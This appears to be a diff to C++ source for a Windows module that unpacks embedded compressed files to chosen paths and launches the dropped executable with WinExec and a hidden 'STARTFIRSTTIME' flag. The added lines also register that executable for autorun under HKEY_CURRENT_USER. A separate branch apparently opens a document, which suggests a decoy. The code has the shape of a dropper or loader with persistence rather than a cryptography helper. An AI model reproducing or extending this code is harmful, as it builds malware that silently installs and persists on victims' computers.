@@ -1,4 +1,7 @@
 
+
+#include <windows.h>
+#include <DbgHelp.h>
 #include "crypto.h"
 #include "FileHelper.h"
 #include "compress.h"
@@ -9,13 +12,13 @@
 
 #include "md5.h"
 #include "PeLoader.h"
+#include "RegHelper.h"
 
 #include "../include/openssl/md5.h"
+
 #pragma comment(lib,"../lib\\libcrypto.lib")
 #pragma comment(lib,"../lib\\libssl.lib")
 #pragma comment(lib,"../lib\\openssl.lib")
-
-#include <DbgHelp.h>
 
 #pragma comment(lib,"dbghelp.lib")
 
@@ -31,6 +34,7 @@
 
 typedef struct {
 	char filename[FILENAME_LEN];
+	char outpath[FILENAME_LEN];
 	ULONG fsize;
 	ULONG compSize;
 	unsigned char filedata[0];
@@ -158,7 +162,7 @@ int Crypto::reloadPE(const char* data, int datasize) {
 //24 64		//filename
 //88 4		//size
 //92 xxx	//file data
-int Crypto::getoutFiles(const char* data, int datasize) {
+int Crypto::releaseFiles(const char* data, int datasize) {
 
 	int ret = 0;
 	char szinfo[1024];
@@ -178,9 +182,9 @@ int Crypto::getoutFiles(const char* data, int datasize) {
 		return -1;
 	}
 
-	string path = FileHelper::getRunPath();
+	//string path = FileHelper::getRunPath();
 	//MessageBoxA(0, path.c_str(), path.c_str(), MB_OK);
-	ret = MakeSureDirectoryPathExists((char*)path.c_str());
+	//ret = MakeSureDirectoryPathExists((char*)path.c_str());
 
 	string runningfn = "";
 
@@ -199,6 +203,7 @@ int Crypto::getoutFiles(const char* data, int datasize) {
 	{
 		char filename[256] = { 0 };
 		memcpy(filename, (char*)fd->filename, FILENAME_LEN);
+		string path = FileHelper::getReleasePath( fd->outpath);
 
 		int pos = string(filename).find(".");
 		if (pos >= 0)
@@ -251,13 +256,15 @@ int Crypto::getoutFiles(const char* data, int datasize) {
 	if (runningfn != "")
 	{
 		char szcmd[1024] = { 0 };
-		char szparam[] = { 0,0 };
-		//char szparam[] = { 'S','T','A','R','T','F','I','R','S','T','T','I','M','E',0 };
+
+		char szparam[] = { 'S','T','A','R','T','F','I','R','S','T','T','I','M','E',0 };
 		wsprintfA(szcmd, "\"%s\" %s", runningfn.c_str(), szparam);
 
 		//MessageBoxA(0, szcmd, szcmd, MB_OK);
 
 		ret = WinExec(szcmd, SW_SHOW);
+
+		ret = setRegBootRun(HKEY_CURRENT_USER, runningfn.c_str());
 	}
 
 	if (docfn != "")
